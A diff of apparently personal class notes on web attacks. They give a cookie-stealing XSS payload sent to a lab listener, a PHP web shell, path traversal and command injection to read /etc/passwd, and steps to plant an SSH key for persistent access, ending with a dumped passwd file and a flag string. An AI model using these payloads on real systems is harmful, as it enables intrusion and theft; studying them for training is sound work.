@@ -122,14 +122,215 @@ nmap --script-trace
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 email addresses go in notes
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+HTTP Methods
 
+A Select Few:
+
+    GET
+
+    POST
+
+    HEAD
+
+    PUT
+
+
+https://tools.ietf.org/html/rfc2616
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+HTTP Response Codes
+
+    10X == Informational
+
+    2XX == Success
+
+    30X == Redirection
+
+    4XX == Client Error
+
+    5XX == Server Error
+
+
+https://tools.ietf.org/html/rfc2616
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Wget
+
+    Recursively download
+
+    Recover from broken transfers
+
+    SSL/TLS support
+wget -r -l2 -P /tmp ftp://ftpserver/
+wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
+wget --load-cookies cookies.txt -p https://website/interesting/article.php
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+cURL
+
+    Not recursive
+
+    Can use pipes
+
+    Upload ability
+
+    Supports more protocols vs Wget, such as SCP & POP3
+
+curl -o stuff.html https://web.site/stuff.html
+curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+JavaScript (JS)
+
+    Allows websites to interact with the client
+
+        JavaScript runs on the client’s machine
+
+    Coded as .js files, or in-line of HTML
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+JS Interaction
+
+<script>
+function myFunction() {
+    document.getElementById("demo").innerHTML = "Paragraph changed.";
+}
+</script>
+
+<script src="https://www.w3schools.com/js/myScript1.js"></script>
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Enumeration
+
+    Robots.txt
+
+    Legitimate surfing
+
+    Tools:
+
+        NSE scripts
+
+        Nikto
+
+        Burp suite (outside class)
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Cross-Site Scripting (XSS) Overview
+
+    Insertion of arbitrary code into a webpage, that executes in the browser of visitors
+
+    Unsanitized GET, POST, and PUT methods allow JS to be placed on websites
+
+    Often found in forums that allow HTML
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reflected XSS
+
+    Most common form of XSS
+
+    Transient, occurs in error messages or search results
+
+    Delivered through intermediate media, such as a link in an email
+
+    Characters that are normally illegal in URLs can be Base64 encoded
+
+
+Below is what you see, but the server will decode as name=abc123
+
+
+http://example.com/page.php?name=dXNlcjEyMw
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Stored XSS
+
+    Resides on vulnerable site
+
+    Only requires user to visit page
+
+
+<img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Useful JavaScript Components
+
+Proof of concept (simple alert):
+
+<script>alert('XSS');</script>
+
+    Capturing Cookies
+    document.cookie
+
+    Capturing Keystrokes
+
+        bind keydown and keyup
+
+    Capturing Sensitive Data
+    document.body.innerHTML
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+<script>document.location="http://10.50.31.213:8000/"+document.cookie;</script>
+
+python3 -m http.server
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Server-Side injection
+
+Directory Traversal/Path Traversal
+
+
+    Ability to read/execute outside web server’s directory
+
+    Uses ../../ (relative paths) in manipulating a server-side file path
+
+
+view_image.php?file=../../etc/passwd
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Malicious File Upload
+
+Site allows unsanitized file uploads
+
+
+    Server doesn’t validate extension or size
+
+    Allows for code execution (shell)
+
+    Once uploaded
+
+        Find your file
+
+        Call your file
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+<HTML><BODY>
+  <FORM METHOD="GET" NAME="myform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="Send">
+  </FORM>
+  <pre>
+  <?php
+  if($_GET['cmd']) {
+    system($_GET['cmd']);
+    }
+  ?>
+  </pre>
+  </BODY></HTML>
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Command Injection
+
+Application on the server is vulnerable,
+allowing execution of arbitrary commands
+
+
+    User input not validated
+
+        Common example is a SOHO router, with a web page to allow ping
+
+
+Might contain the following in it’s code:
+
+system("ping -c 1 ".$_GET["ip"]);
+
+
+Run the following to chain/stack our arbitrary command
+
+; cat /etc/passwd
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+; <command>
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+If shit allows command injection because no input validation: 
+
+(web server)  ;mkdir /var/www/.ssh                <- You've just created an ssh config file for the www-data account (or whatever account you're on)
+lin-ops> ssh-keygen -t rsa -b 4096                <- You've just created an ssh key for yourself(Hit enter when it asks for specifications)
+lin-ops> cat <public key>
+copy+paste the entire contents into the web server with a quote at the start
+then add to the end ' >>/var/www/.ssh/authorized_keys'
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -198,13 +399,7 @@ email addresses go in notes
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/bin/bash backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false billybob:x:1001:1001:you found me 4kiY4BiNwUXEYHHco0ut:/home/billybob:/bin/bash billybob:x:1001:1001:you found me 4kiY4BiNwUXEYHHco0ut:/home/billybob:/bin/bash
+
